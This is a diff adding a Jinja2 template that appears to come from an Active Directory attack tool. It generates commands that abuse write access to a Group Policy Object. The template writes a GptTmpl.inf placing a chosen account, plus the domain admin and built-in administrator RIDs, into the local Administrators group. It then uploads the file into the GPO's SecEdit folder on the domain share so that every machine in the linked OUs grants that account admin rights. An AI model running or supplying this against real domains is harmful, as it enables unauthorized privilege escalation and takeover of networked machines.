@@ -1,0 +1,30 @@
+{% set gpo = require['original_target'] %}
+{% if gpo.gpo_links_to_ou %}
+# The GPO {{gpo.name}} is linked on OU(s):
+    {% for dn in gpo.gpo_links_to_ou %}
+# {{dn}}
+    {% endfor %}
+{%- else %}
+# The GPO {{gpo.name}} is not linked to an OU
+{%- endif %}
+
+# Prepare the GptTmpl (replace or update it!)
+# Add {{parent.obj.name}} in the local group Administrators
+# Warning: updating the members of a local group removes all previous
+# members. If the GPO is unlink or restored then the members list is also
+# restored to the default values. A better solution is to check if {{parent.obj.name}}
+# is in any group, then set this group into the local admin group like:
+# *<GROUP_SID>__Memberof =
+# *<GROUP_SID>__Members = *S-1-5-32-544
+./tools/gpttmpl.py S-1-5-32-544 --members {{parent.obj.sid}},{{domain_sid}}-512,{{domain_sid}}-500 >GptTmpl.inf
+
+{% include '_pre_update_gpo.jinja2' %}
+
+# Create the subpath if not present and push GptTmpl.inf
+cd /{{fqdn_lower}}/Policies/{{gpo.gpo_dirname_id}}/Machine/Microsoft/Windows NT/SecEdit
+## get GptTmpl.inf # to restore it if you want
+put GptTmpl.inf
+exit
+
+{% set extnames = '[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]' %}
+{% include '_post_update_gpo.jinja2' %}
